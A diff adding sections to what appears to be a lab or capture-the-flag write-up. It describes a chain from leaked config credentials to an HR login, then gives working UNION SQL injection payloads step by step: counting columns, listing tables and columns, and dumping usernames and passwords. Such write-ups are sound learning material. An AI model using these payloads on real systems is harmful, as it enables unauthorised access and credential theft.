@@ -159,4 +159,68 @@ The credentials obtained from the exposed `config.php` file were used to log in 
 
 ![HR Login](images/hr-login.png)
 
+So exact chain:
+Mail Log → Information Disclosure → file.php → file://config.php → HR Password → HR Login
 
+## 6. SQL Injection
+
+After logging into the HR account, I accessed the Candidate Applications page, which contains a search functionality.
+
+I tested the search parameter with a single quote (`'`) to check how the application handled user input. The application returned a MySQL syntax error, indicating that the input was being directly included in a SQL query.
+
+This confirmed that the search parameter was vulnerable to SQL Injection.
+
+![SQL Injection Error](images/sqli-error.png)
+
+## 8. UNION SQL Injection
+
+### I tested the number of columns using:
+
+```sql
+' UNION SELECT NULL,NULL,NULL,NULL-- -
+```
+![SQL Injection Error](images/union-sqli.png)
+
+The query was accepted, indicating a four-column result set.
+
+### I then tested which column was reflected:
+```
+' UNION SELECT NULL,1+1,NULL,NULL-- -
+```
+The response displayed `2`, confirming that the `second column` was reflected in the application.
+
+Identifying the Current Database
+
+### Next, I used the database() function to identify the current database:
+```
+' UNION SELECT NULL,database(),NULL,NULL-- -
+```
+The application returned the database name=`recruit_db`, confirming the database context used by the application.
+
+### Enumerating Database Tables
+I then queried `information_schema.tables` to identify the tables available in the current database:
+```
+' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
+```
+The response revealed the available tables, including the users table.
+
+![SQL Injection Error](images/database_tables.png)
+
+### Enumerating Columns
+After identifying the users table, I enumerated its columns:
+```
+' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'-- -
+```
+The response revealed the following columns:
+id, username, password
+
+![SQL Injection Error](images/database-column.png)
+
+### Extracting User Credentials
+
+Since the users table contained username and password columns, I queried those fields using UNION SQL Injection:
+```
+' UNION SELECT NULL,GROUP_CONCAT(username,':',password SEPARATOR '<br>'),NULL,NULL FROM users-- -
+```
+This returned the stored user credentials, including the administrator account.
+The administrator credentials were then used for the final administrative login.
